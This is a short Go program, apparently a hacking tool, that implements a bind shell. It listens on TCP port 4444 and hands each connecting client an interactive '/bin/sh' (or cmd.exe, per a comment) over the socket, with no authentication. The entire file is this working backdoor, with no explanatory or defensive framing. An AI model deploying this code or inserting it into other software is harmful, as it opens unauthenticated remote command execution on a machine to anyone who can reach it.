package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

func handle(conn net.Conn) {
	//cmd := exec.Command("cmd.exe") // Windows
	cmd := exec.Command("/bin/sh", "-i") // Linux
	rp, wp := io.Pipe()

	// Set stdin to our connection
	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}

func main() {
	listener, err := net.Listen("tcp", ":4444")
	if err != nil {
		log.Fatalln(err)
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln(err)
		}
		go handle(conn)
	}
}
